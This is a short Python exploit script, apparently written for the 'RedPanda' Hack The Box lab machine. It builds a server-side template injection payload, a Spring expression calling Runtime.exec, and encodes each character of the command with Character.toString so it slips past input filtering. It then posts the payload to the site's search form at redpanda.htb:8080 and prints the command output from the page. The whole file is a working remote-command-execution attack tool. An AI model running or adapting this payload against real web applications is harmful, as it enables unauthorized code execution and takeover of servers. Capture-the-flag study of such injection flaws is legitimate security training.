import sys, requests
from bs4 import BeautifulSoup

def convert_this(txt):
    convert_me = txt
    base_string = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString('

    first_character = True

    for x in convert_me:
        if first_character:
            base_string = base_string + f'{ord(x)})'
            first_character = False
        else:
            base_string = base_string + f'.concat(T(java.lang.Character).toString({ord(x)}))'
        
    base_string = base_string + ').getInputStream())}'
    return base_string

def get_result(txt):
    url = "http://redpanda.htb:8080/search"
    data = {'name':txt}
    r = requests.post(url, data=data)
    html = r.text
    soup = BeautifulSoup(html, 'html.parser')
    result = soup.findAll('h2', {"class":"searched"})
    return result


if __name__ == '__main__':
    command = convert_this(sys.argv[1])
    #print(command)
    r = get_result(command)
    print(r)
